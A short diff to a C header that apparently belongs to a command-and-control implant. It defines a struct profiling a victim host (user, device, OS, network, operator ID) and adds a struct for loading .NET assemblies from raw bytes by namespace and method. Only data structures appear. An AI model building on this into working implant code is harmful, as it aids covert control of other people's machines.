@@ -15,10 +15,10 @@ typedef struct {
     char ID[256];
     char DeviceName[256];
     char Username[256];
-    char OperatorID[256]; // int type instead of string
+    char OperatorID[256];
     char CPUArchitecture[256];
     char GPUInfo[256];
-    char RAMInfo[256]; // int type instead of string
+    char RAMInfo[256];
     char OSName[256];
     char NetworkInfo[256];
     char CurrentDate[256];
@@ -30,3 +30,11 @@ typedef struct Output {
     char *Output;
     char *DateFromLast;
 } Output;
+
+typedef struct NetAssembly {
+    char* Name;
+    unsigned char* Bytes;
+    char* Namespace;
+    char* Method;
+    char* Args;
+};
